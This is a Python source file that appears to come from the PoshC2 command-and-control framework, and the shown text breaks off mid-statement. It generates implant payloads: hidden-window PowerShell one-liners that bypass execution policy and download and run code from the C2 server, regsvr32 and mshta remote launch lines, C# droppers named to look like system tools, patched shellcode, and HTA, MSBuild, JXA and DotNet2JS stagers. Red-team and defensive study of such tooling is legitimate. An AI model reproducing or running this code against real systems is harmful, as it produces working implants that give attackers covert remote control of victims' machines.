import base64
import gzip
import hashlib
import importlib
import os
import re
import shutil
import subprocess
import time
from datetime import datetime
from distutils.dir_util import copy_tree
from enum import Enum
from urllib.parse import urlparse

import donut

from poshc2 import Colours
from poshc2.Utils import gen_key, offset_finder, get_first_url, new_implant_id
from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, \
    PayloadDomainCheck as DefaultPayloadDomainCheck
from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, PayloadModulesDirectory, Jitter
from poshc2.server.Config import StageRetries, StageRetriesInitialWait, StageRetriesLimit, \
    FCommFilePath as DefaultFCommFileName
from poshc2.server.Core import get_images, print_bad, build_sharp_config, encrypt
from poshc2.server.database.Helpers import get_url, get_default_url, select_first
from poshc2.server.database.Model import C2Server


class PayloadType(Enum):
    Posh_v2 = "Posh_v2"
    Posh_v4 = "Posh_v4"
    Sharp = "Sharp_v4"
    PBindSharp = "PBindSharp_v4"
    FCommSharp = "FCommSharp_v4"
    Unmanaged = "Unmanaged"


class Payloads(object):
    quickstart = None

    def __init__(self, killdate, encryption_key, ignore_invalid_tls_certs, useragent, referrer_header, connect_url,
                 output_directory, url_id=None, powershell_proxy_command="",
                 pbind_pipe_name=DefaultPBindPipeName, pbind_secret=DefaultPBindSecret,
                 payload_domain_check=DefaultPayloadDomainCheck, fcomm_file_name=DefaultFCommFileName):

        if not url_id:
            url = get_default_url()
        else:
            url = get_url(url_id)

        self.url_id = url.id
        self.kill_date = killdate
        self.encryption_key = encryption_key
        self.hosted_files_url = select_first(C2Server.hosted_file_url)
        self.first_url = get_first_url(select_first(C2Server.payload_comms_host),
                                       select_first(C2Server.domain_front_header))
        self.payload_comms_host = url.url
        self.domain_front_header = url.host_header
        self.proxy_url = url.proxy_url
        self.proxy_user = url.proxy_username
        self.proxy_password = url.proxy_password
        self.powershell_proxy_command = powershell_proxy_command
        self.ignore_invalid_tls_certs = ignore_invalid_tls_certs
        self.user_agent = useragent
        self.referrer_header = referrer_header
        self.connect_url = connect_url
        self.output_directory = output_directory
        self.pbind_pipe_name = pbind_pipe_name
        self.pbind_secret = pbind_secret
        self.payload_domain_check = payload_domain_check
        self.fcomm_file_path = fcomm_file_name
        self.output_directory = output_directory
        self.stage_retries = StageRetries
        self.stage_retries_limit = StageRetriesLimit
        self.stage_retries_initial_wait = StageRetriesInitialWait
        self.ps_dropper = ""
        self.py_dropper = ""
        self.all_beacon_urls = select_first(C2Server.urls)
        self.all_beacon_images = get_images()
        self.kill_date = select_first(C2Server.kill_date)
        self.jitter = Jitter
        self.sleep = select_first(C2Server.default_sleep)

        aes_file = f"{PayloadsDirectory}aes.py"
        if os.path.exists(aes_file):
            with open(aes_file, 'r') as f:
                content = f.read()
            match = re.search('#KEY(.+?)#KEY', content)
            if match:
                keyfound = match.group(1)
                self.py_dropper_hash = hashlib.sha512(content.encode("utf-8")).hexdigest()
                self.py_dropper_key = keyfound
            else:
                print(f"Unable to find key in aes payload: {aes_file}")
                return
        else:
            self.py_dropper_key = str(gen_key().decode("utf-8"))
            with open(f"{PayloadTemplatesDirectory}aes.py", 'r') as f:
                content = f.read()
            aes_py = str(content).replace("#REPLACEKEY#", f"#KEY{self.py_dropper_key}#KEY")
            filename = f"{self.output_directory}aes.py"
            with open(filename, 'w') as f:
                f.write(aes_py)
            self.py_dropper_hash = hashlib.sha512(aes_py.encode('utf-8')).hexdigest()

        with open(f"{PayloadTemplatesDirectory}dropper.ps1", 'r') as f:
            content = f.read()
        self.ps_dropper = str(content) \
            .replace("#REPLACEINSECURE#", self.ignore_invalid_tls_certs) \
            .replace("#REPLACEHOSTPORT#", self.payload_comms_host) \
            .replace("#REPLACECONNECTURL#", self.connect_url) \
            .replace("#REPLACEIMPTYPE#", self.payload_comms_host) \
            .replace("#REPLACEKILLDATE#", self.kill_date) \
            .replace("#REPLACEPROXYUSER#", self.proxy_user) \
            .replace("#REPLACEPROXYPASS#", self.proxy_password) \
            .replace("#REPLACEPROXYURL#", self.proxy_url) \
            .replace("#REPLACEPROXYCOMMAND#", self.powershell_proxy_command) \
            .replace("#REPLACEDOMAINFRONT#", self.domain_front_header) \
            .replace("#REPLACECONNECT#", self.connect_url) \
            .replace("#REPLACEUSERAGENT#", self.user_agent) \
            .replace("#REPLACEREFERER#", self.referrer_header) \
            .replace("#REPLACEURLID#", str(self.url_id)) \
            .replace("#REPLACEKEY#", self.encryption_key) \
            .replace("#REPLACEMEDOMAIN#", str(self.payload_domain_check)) \
            .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.stage_retries_limit).lower()) \
            .replace("#REPLACESTAGERRETRIES#", str(self.stage_retries).lower()) \
            .replace("#REPLACESTAGERRETRIESWAIT#", str(self.stage_retries_initial_wait))

    def quickstart_log(self, txt=""):
        if not self.quickstart:
            self.quickstart = ''
        txt = f"{Colours.GREEN}{txt}{Colours.END}"
        print(txt)
        self.quickstart += txt + '\n'

    def write_quickstart_log(self, path):
        with open(path, 'w') as f:
            f.write(self.quickstart + Colours.END)
            print("")
            print(Colours.END + 'Quickstart written to ' + path + Colours.GREEN)

    def create_raw_base(self, full=False, name=""):
        data = bytes(self.ps_dropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = f"IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('{gzipdata}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
        batfile = f"powershell -exec bypass -Noninteractive -windowstyle hidden -e {encodedPayload}"
        if full:
            return batfile
        else:
            return base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")

    def create_raw(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log(f"Raw Payload written to: {self.output_directory}{name}payload.txt")

        dropper_bytes = bytes(self.ps_dropper, 'utf-8')
        compressed_dropper_bytes = gzip.compress(dropper_bytes)
        gzipdata = base64.b64encode(compressed_dropper_bytes).decode("utf-8")
        b64gzip = f"IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('{gzipdata}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"

        with open(f"{self.output_directory}{name}payload.txt", 'w') as f:
            f.write(self.ps_dropper)

        self.quickstart_log(f"Batch Payload written to: {self.output_directory}{name}payload.bat")

        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE'))
        batfile = f"powershell -exec bypass -Noninteractive -windowstyle hidden -e {encodedPayload.decode('utf-8')}"

        with open(f"{self.output_directory}{name}payload.bat", 'w') as f:
            f.write(batfile)

        if name == "":
            ps_uri = f"{self.first_url}/{self.hosted_files_url}_rp"
            powershell_command = f"Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('{ps_uri}'))))"
            base64_powershell_command = base64.b64encode(powershell_command.encode('UTF-16LE'))

            self.quickstart_log(
                f"\npowershell -Noninteractive -windowstyle hidden -e {base64_powershell_command.decode('UTF-8')}")

            self.quickstart_log(
                f"\npowershell -c {powershell_command}")

    def create_droppers(self, name="", pbind_only=False, debug_payloads=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log(f"Droppers:" + Colours.GREEN)

        if debug_payloads:
            self.quickstart_log("Generating debug payloads")

        if not pbind_only:
            self.quickstart_log(f"C# Powershell v2 EXE written to: {self.output_directory}{name}dropper_ps_v2.exe")
            self.quickstart_log(f"C# Powershell v4 EXE written to: {self.output_directory}{name}dropper_ps_v4.exe")
            self.quickstart_log(f"C# Dropper EXE written to: {self.output_directory}{name}dropper_cs.exe")
            self.quickstart_log(f"C# PBind Dropper EXE written to: {self.output_directory}{name}pbind_cs.exe")
            self.quickstart_log(f"C# FComm Dropper EXE written to: {self.output_directory}{name}fcomm_cs.exe")
        else:
            self.quickstart_log(f"C# PBind Dropper EXE written to: {self.output_directory}{name}pbind_cs.exe")

        sharp_dropper_compile_command = f"mono-csc {self.output_directory}sharp-dropper/*.cs  -out:{self.output_directory}System.Config.Manager.exe -target:exe -warn:1 -sdk:4"

        if not pbind_only:
            with open(f"{PayloadTemplatesDirectory}Sharp_Powershell_Runner.cs", 'r') as f:
                original_content = f.read()
            original_content = original_content.replace("#REPLACEME#",
                                                        base64.b64encode(self.ps_dropper.encode("utf-8")).decode(
                                                            "utf-8"))
            filename = f"{self.output_directory}{name}Sharp_Posh_Stager.cs"
            with open(filename, 'w') as f:
                f.write(original_content)

            subprocess.check_output(
                f"mono-csc {self.output_directory}{name}Sharp_Posh_Stager.cs -out:{self.output_directory}{name}dropper_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:{PayloadTemplatesDirectory}System.Management.Automation.dll",
                shell=True)
            subprocess.check_output(
                f"mono-csc {self.output_directory}{name}Sharp_Posh_Stager.cs -out:{self.output_directory}{name}dropper_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:{PayloadTemplatesDirectory}System.Management.Automation.dll",
                shell=True)

            shutil.copytree(f"{PayloadTemplatesDirectory}sharp-dropper", f"{self.output_directory}sharp-dropper",
                            dirs_exist_ok=True)

            with open(f"{self.output_directory}sharp-dropper/Program.cs", 'r') as f:
                original_content = f.read()

            http_config_string = build_sharp_config(stage_comms_hosts=self.payload_comms_host,
                                                    stage_comms_headers=self.domain_front_header,  # TODO separate
                                                    beacon_comms_hosts=self.payload_comms_host,
                                                    beacon_comms_headers=self.domain_front_header,
                                                    stage_uri=self.connect_url,
                                                    kill_date=self.kill_date,
                                                    encryption_key=self.encryption_key,
                                                    user_agent=self.user_agent,
                                                    referrer_header=self.referrer_header,
                                                    proxy_url=self.proxy_url,
                                                    proxy_user=self.proxy_user,
                                                    proxy_password=self.proxy_password,
                                                    url_id=self.url_id,
                                                    payload_domain_check=self.payload_domain_check,
                                                    stage_retries=self.stage_retries,
                                                    stage_retries_limit=self.stage_retries_limit,
                                                    stage_retries_initial_wait=self.stage_retries_initial_wait,
                                                    jitter=self.jitter,
                                                    sleep=self.sleep)

            config_encryption_key = gen_key().decode("utf-8")
            reversed_encoded_encrypted_http_config = encrypt(config_encryption_key, http_config_string).decode("utf-8")[
                                                     ::-1]

            http_content = str(original_content) \
                .replace("#REPLACEMEBASE64CONFIGREVERSED#", reversed_encoded_encrypted_http_config) \
                .replace("#REPLACECONFIGKEY#", config_encryption_key)

            with open(f"{self.output_directory}sharp-dropper/Program.cs", 'w') as f:
                f.write(str(http_content))

            http_compile_command = f"{sharp_dropper_compile_command} -define:HTTP"

            if debug_payloads:
                http_compile_command += " -define:DEBUG"

            subprocess.check_output(http_compile_command, shell=True)
            os.rename(f"{self.output_directory}System.Config.Manager.exe",
                      f"{self.output_directory}{name}dropper_cs.exe")

            pbind_config_string = build_sharp_config(kill_date=self.kill_date,
                                                     encryption_key=self.encryption_key,
                                                     url_id=self.url_id,
                                                     payload_domain_check=self.payload_domain_check,
                                                     pbind_pipe_name=self.pbind_pipe_name,
                                                     pbind_secret=self.pbind_secret,
                                                     sleep="0s")

            config_encryption_key = gen_key().decode("utf-8")
            reversed_encoded_encrypted_pbind_config = encrypt(config_encryption_key, pbind_config_string).decode(
                "utf-8")[::-1]

            pbind_content = str(original_content) \
                .replace("#REPLACEMEBASE64CONFIGREVERSED#", reversed_encoded_encrypted_pbind_config) \
                .replace("#REPLACECONFIGKEY#", config_encryption_key)

            with open(f"{self.output_directory}sharp-dropper/Program.cs", 'w') as f:
                f.write(str(pbind_content))

            pbind_compile_command = f"{sharp_dropper_compile_command} -define:PBIND"

            if debug_payloads:
                pbind_compile_command += " -define:DEBUG"

            subprocess.check_output(pbind_compile_command, shell=True)
            os.rename(f"{self.output_directory}System.Config.Manager.exe", f"{self.output_directory}{name}pbind_cs.exe")

        # FComm CSharp Dropper
        if not pbind_only:
            fcomm_config_string = build_sharp_config(kill_date=self.kill_date,
                                                     encryption_key=self.encryption_key,
                                                     url_id=self.url_id,
                                                     payload_domain_check=self.payload_domain_check,
                                                     fcomm_file_path=self.fcomm_file_path)

            config_encryption_key = gen_key().decode("utf-8")
            reversed_encoded_encrypted_fcomm_config = encrypt(config_encryption_key, fcomm_config_string).decode(
                "utf-8")[::-1]

            fcomm_content = str(original_content) \
                .replace("#REPLACEMEBASE64CONFIGREVERSED#", reversed_encoded_encrypted_fcomm_config) \
                .replace("#REPLACECONFIGKEY#", config_encryption_key)

            with open(f"{self.output_directory}sharp-dropper/Program.cs", 'w') as f:
                f.write(str(fcomm_content))

            fcomm_compile_command = f"{sharp_dropper_compile_command} -define:FCOMM"

            if debug_payloads:
                fcomm_compile_command += " -define:DEBUG"

            subprocess.check_output(fcomm_compile_command, shell=True)
            os.rename(f"{self.output_directory}System.Config.Manager.exe", f"{self.output_directory}{name}fcomm_cs.exe")


    def create_unmanaged_windows(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log("Windows native files:")

        # Serialize our config data in a way that can be embedded into the resource section of the dropper binary
        # Arrays of items are represented by repeated keys (e.g. domain_front_header=header1.google.com\0domain_front_header=header2.google.com
        # the overall string MUST be null terminated
        # For now, ints and floats are represented as strings, might be good to serialise them (with struct?) in the future

        # Even if domain fronting hasn't been setup by the user, we need to set a 'domain-front-header' per C2 comms host as otherwise Curl sends requests with an empty hosts header
        # and that breaks things...

        # The basic logic is to loop through each server that is set, and see if there's a matching domain front header.
        # If not, extract the netloc from the URL (e.g. the domain) and use that
        servers = self.payload_comms_host.split(",")
        domain_front_headers = self.domain_front_header.split(",")

        host_headers = []
        for i in range(0, len(servers)):
            try:
                dfh_len = len(domain_front_headers[i].replace("\"", ""))
            except IndexError:
                dfh_len = 0
                pass

            if dfh_len == 0:
                host_headers.append(urlparse(servers[i].replace("\"", "")).hostname)
            # A host header was set - so use that instead
            else:
                host_headers.append(domain_front_headers[i])

        mapping = {
            "key=": self.encryption_key,
            "urlid=": self.url_id,
            "url_suffix2=": self.connect_url + "?n",
            "domain_front_hdr=": host_headers,
            "server_clean=": self.payload_comms_host.replace("https://", "").split(","),
            "ua=": self.user_agent,
            "proxy_url=": self.proxy_url,
            "proxy_user=": self.proxy_user,
            "proxy_pass=": self.proxy_password,
            "sleep_time=": self.sleep.replace("s", ""),  # TODO what if hours or minutes?
            "kill_date=": int(time.mktime(datetime.strptime(self.kill_date, "%Y-%m-%d").timetuple())),
        }

        config_string = ''

        for element in mapping:
            if isinstance(mapping[element], list):
                for item in mapping[element]:
                    config_string += element
                    config_string += str(item).replace("\"", "").strip()
                    config_string += "\x00"
            else:
                config_string += element
                config_string += str(mapping[element]).replace("\"", "").strip()
                config_string += "\x00"

        config_string += "CONFIG_END\x00"

        with open(f'{self.output_directory}{name}windows_config.bin', 'w') as f:
            f.write(config_string)

        self.quickstart_log(f'Windows config written to {self.output_directory}{name}windows_config.bin')


    def patch_bytes(self, filename, dll, offset, patch_placeholder_length, payload_type, name=""):
        filename = f"{self.output_directory}{filename}"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(dll))

        if payload_type == PayloadType.Posh_v2:
            source_file_name = f"{self.output_directory}{name}{'dropper_ps_v2.exe'}"

        elif payload_type == PayloadType.Posh_v4:
            source_file_name = f"{self.output_directory}{name}{'dropper_ps_v4.exe'}"

        elif payload_type == PayloadType.Sharp:
            source_file_name = f"{self.output_directory}{name}{'dropper_cs.exe'}"

        elif payload_type == PayloadType.PBindSharp:
            source_file_name = f"{self.output_directory}{name}{'pbind_cs.exe'}"

        elif payload_type == PayloadType.FCommSharp:
            source_file_name = f"{self.output_directory}{name}{'fcomm_cs.exe'}"

        elif payload_type == PayloadType.Unmanaged:
            source_file_name = f"{self.output_directory}{name}{'windows_config.bin'}"

        else:
            return

        with open(source_file_name, "rb") as f:
            dllbase64 = f.read()
        dllbase64 = base64.b64encode(dllbase64).decode("utf-8")
        if payload_type == PayloadType.Unmanaged:
            dllbase64 = dllbase64[::-1]
        patch_leftovers = patch_placeholder_length - len(dllbase64)

        if len(dllbase64) > patch_placeholder_length:
            raise Exception(
                f"\nPatch length ({len(dllbase64)}) is greater than the placeholder space available in the shellcode ({patch_placeholder_length}) (more AAAAs need to be added to the buffer)")

        patch = dllbase64
        patch2 = "".ljust(patch_leftovers, '\x00')
        patch3 = f"{patch}{patch2}"

        with open(filename, "r+b") as f:
            f.seek(offset)
            f.write(bytes(patch3, 'UTF-8'))

        self.quickstart_log(f"Payload written to: {filename}")

    def create_shellcode_file(self, bin_destination, base64_destination, template_file, payload_type, name=""):
        with open(template_file, 'r') as f:
            fileRead = f.read()
        patch_offset, patch_placeholder_length = offset_finder(template_file)
        self.patch_bytes(bin_destination, fileRead, patch_offset, patch_placeholder_length, payload_type, name)
        with open(f"{self.output_directory}{bin_destination}", 'rb') as binary:
            with open(f"{self.output_directory}{base64_destination}", 'wb') as b64:
                b64.write(base64.b64encode(binary.read()))

    def create_shellcode(self, name="", pbind_only=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log("Shellcode that loads CLR v2.0.50727 or v4.0.30319:" + Colours.GREEN)
        if not pbind_only:
            self.create_shellcode_file(f"{name}Posh_v2_x86_Shellcode.bin", f"{name}Posh_v2_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v2_x86_Shellcode.b64",
                                       PayloadType.Posh_v2, name)
            self.create_shellcode_file(f"{name}Posh_v2_x64_Shellcode.bin", f"{name}Posh_v2_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v2_x64_Shellcode.b64",
                                       PayloadType.Posh_v2, name)
            self.create_shellcode_file(f"{name}Posh_v4_x86_Shellcode.bin", f"{name}Posh_v4_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64",
                                       PayloadType.Posh_v4, name)
            self.create_shellcode_file(f"{name}Posh_v4_x64_Shellcode.bin", f"{name}Posh_v4_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                       PayloadType.Posh_v4, name)
            self.create_shellcode_file(f"{name}Sharp_v4_x86_Shellcode.bin", f"{name}Sharp_v4_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64",
                                       PayloadType.Sharp, name)
            self.create_shellcode_file(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                       PayloadType.Sharp, name)
            self.create_shellcode_file(f"{name}PBindSharp_v4_x86_Shellcode.bin",
                                       f"{name}PBindSharp_v4_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64",
                                       PayloadType.PBindSharp, name)
            self.create_shellcode_file(f"{name}PBindSharp_v4_x64_Shellcode.bin",
                                       f"{name}PBindSharp_v4_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                       PayloadType.PBindSharp, name)
            self.create_shellcode_file(f"{name}FCommSharp_v4_x86_Shellcode.bin",
                                       f"{name}FCommSharp_v4_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64",
                                       PayloadType.FCommSharp, name)
            self.create_shellcode_file(f"{name}FCommSharp_v4_x64_Shellcode.bin",
                                       f"{name}FCommSharp_v4_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                       PayloadType.FCommSharp, name)
            self.create_shellcode_file(f"{name}Unmanaged_x86_Shellcode.bin", f"{name}Unmanaged_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Unmanaged_x86_Shellcode.b64", PayloadType.Unmanaged,
                                       name)
            self.create_shellcode_file(f"{name}Unmanaged_x64_Shellcode.bin", f"{name}Unmanaged_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Unmanaged_x64_Shellcode.b64", PayloadType.Unmanaged,
                                       name)
        else:
            self.create_shellcode_file(f"{name}PBindSharp_v4_x86_Shellcode.bin",
                                       f"{name}PBindSharp_v4_x86_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64",
                                       PayloadType.PBindSharp, name)
            self.create_shellcode_file(f"{name}PBindSharp_v4_x64_Shellcode.bin",
                                       f"{name}PBindSharp_v4_x64_Shellcode.b64",
                                       f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                       PayloadType.PBindSharp, name)

    def createsct(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.first_url}/{self.hosted_files_url}_rg")
        with open("%sdropper_rg.sct" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", self.create_raw_base())
        with open("%s%srg_sct.xml" % (self.output_directory , name), 'w') as f:
            f.write(content)

        self.quickstart_log(Colours.END)
        self.quickstart_log("mshta.exe 'vbscript:GetObject(\"script:%s\")(window.close)'" % f"{self.first_url}/{self.hosted_files_url}_cs")
        with open("%sdropper_cs.sct" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", self.create_raw_base())
        with open("%s%scs_sct.xml" % (self.output_directory, name), 'w') as f:
            f.write(content)

    def createhta(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log("HTA Payload written to: %s%sLauncher.hta" % (self.output_directory, name))

        basefile = self.create_raw_base(full=True)
        with open("%sdropper.hta" % (PayloadTemplatesDirectory), 'r') as f:
            hta = f.read()
        hta = str(hta) \
            .replace("#REPLACEME#", basefile)
        with open("%s%sLauncher.hta" % (self.output_directory, name), 'w') as f:
            f.write(hta)

    def createmsbuild(self, name="", pbindOnly=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log("Msbuild payload files:")

        for Payload in PayloadType:
            if not pbindOnly:
                self.createmsbuildfiles(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.createmsbuildfiles(Payload, name)

    def createmsbuildfiles(self, payloadtype, name=""):
        self.quickstart_log("Payload written to: %s%s%s_msbuild.xml" % (self.output_directory, name, payloadtype.value))

        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.output_directory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.output_directory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBindSharp:
            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.FCommSharp:
            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Unmanaged:
            with open("%s%s" % (self.output_directory, name + "Unmanaged_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Unmanaged_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()                

        x86base64 = base64.b64encode(x86base64)
        x64base64 = base64.b64encode(x64base64)

        with open("%smsbuild.xml" % (PayloadTemplatesDirectory), 'r') as f:
            msbuild = f.read()
        msbuild = str(msbuild) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(new_implant_id()))

        with open("%s%s%s_msbuild.xml" % (self.output_directory, name, payloadtype.value), 'w') as f:
            f.write(msbuild)

    def createcsc(self, name="", pbindOnly=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log("CSC payload files:")

        for Payload in PayloadType:
            if not pbindOnly:
                self.createcscfiles(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.createcscfiles(Payload, name)

    def createcscfiles(self, payloadtype, name=""):
        self.quickstart_log("Payload written to: %s%s%s_csc.cs" % (self.output_directory, name, payloadtype.value))

        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.output_directory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.output_directory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBindSharp:
            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.FCommSharp:
            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Unmanaged:
            with open("%s%s" % (self.output_directory, name + "Unmanaged_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.output_directory, name + "Unmanaged_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()                

        x86base64 = base64.b64encode(x86base64)
        x64base64 = base64.b64encode(x64base64)

        with open("%scsc.cs" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(new_implant_id()))

        with open("%s%s%s_csc.cs" % (self.output_directory, name, payloadtype.value), 'w') as f:
            f.write(content)

    def create_dotnet2js(self, name="", pbind_only=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log("DotNet2JS Payloads:")

        for Payload in PayloadType:
            if not pbind_only:
                self.create_dotnet2js_files(Payload, name)
            if pbind_only and Payload == PayloadType.PBindSharp:
                self.create_dotnet2js_files(Payload, name)

    def create_dotnet2js_files(self, payloadtype, name=""):
        self.quickstart_log(f"Payload written to: {self.output_directory}{name}{payloadtype.value}_DotNet2JS.js")
        self.quickstart_log(f"Payload written to: {self.output_directory}{name}{payloadtype.value}_DotNet2JS.b64")
        with open(f"{PayloadTemplatesDirectory}DotNet2JS.js", 'r') as f:
            dotnet = f.read()

        with open(f'{self.output_directory}{name}{payloadtype.value}_x64_Shellcode.b64', 'rb') as f:
            shellcode64 = f.read()
        with open(f'{self.output_directory}{name}{payloadtype.value}_x86_Shellcode.b64', 'rb') as f:
            shellcode32 = f.read()

        dotnet = dotnet \
            .replace("#REPLACEME32#", shellcode32.decode('utf-8')) \
            .replace("#REPLACEME64#", shellcode64.decode('utf-8'))

        filename = f"{self.output_directory}{name}{payloadtype.value}_DotNet2JS.js"
        with open(filename, 'w') as f:
            f.write(dotnet)

        filename = f"{self.output_directory}{name}{payloadtype.value}_DotNet2JS.b64"
        with open(filename, 'w') as f:
            f.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))

    def create_jxa(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log(f"macOS JXA Dropper written to: {self.output_directory}dropper_jxa.js")

        # get the JXA dropper template
        with open(f"{PayloadTemplatesDirectory}dropper_jxa.js", 'r') as f:
            dropper_file = f.read()

        # patch the key settings into the file
        self.JXADropper = str(dropper_file) \
            .replace("#REPLACEKILLDATE#", self.kill_date) \
            .replace("#REPLACEKEY#", self.encryption_key) \
            .replace("#REPLACEHOSTPORT#", self.payload_comms_host) \
            .replace("#REPLACEQUICKCOMMAND#", "/" + self.hosted_files_url + "_jxa") \
            .replace("#REPLACECONNECTURL#", self.connect_url + "?j") \
            .replace("#REPLACEDOMAINFRONT#", self.domain_front_header) \
            .replace("#REPLACEREFERER#", self.referrer_header) \
